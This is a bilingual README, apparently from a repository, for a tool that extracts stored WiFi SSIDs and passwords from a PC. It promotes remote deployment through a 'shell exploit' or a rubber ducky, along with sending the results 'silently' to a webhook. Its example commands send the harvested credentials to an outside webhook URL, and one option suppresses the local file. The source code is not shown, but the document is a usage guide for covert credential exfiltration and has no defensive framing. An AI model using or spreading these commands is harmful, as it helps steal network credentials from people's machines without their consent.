# WIFI_Extractor

if you run it with python you might need this requeriments
Si lo ejecutas con python tal vez podrias necesitar estos requerimientos


pip install click

pip install elementpath

pip install requests

Script to extract WIFI passwords from a pc uploading it remotely (shell exploit) and send it to a url "silently"(webhook without leaving files 
and also can be used offline, physically (rubber ducky)

Script para extraer contraseñas WIFI de un pc subiendolo remotamente(shell exploit) y enviarlo a una url "silenciosamente"(webhook) 
Tambien se puede usar offline, físicamente con un pendrive(rubber ducky)


Usage: E_WIFI.exe [OPTIONS]

Options:
  -u, --url TEXT      Webhook/POST URL
  -n, --no-txt        No crea el archivo txt | Doesn't create the txt file
  -v, --version       Imprime la version | Prints the version
  -p, --print-output  Muestra la salida en la terminal | Shows the output in
                      the terminal
  --help              Show this message and exit.
  

Offline

python3 E_WIFIoffline.py

CMD or Powershell E_WIFIoffline.exe | ./E_WIFIoffline.exe (You can also double click it)

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Online

Usages

default usage
python3 E_WIFI.py

CMD or Powershell E_WIFI.exe | ./E_WIFI.exe

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Another Example

python3 E_WIFI.py -u https://webhook.site/yoururl -n -p 
CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -u https://webhook.site/yoururl -n -p

type --help for more detailed info

PD: THE TXT IS CREATED BY DEFAULT -n TURN IT OFF
    EL TXT SE CREA POR DEFECTO -n APAGA LA CREACION
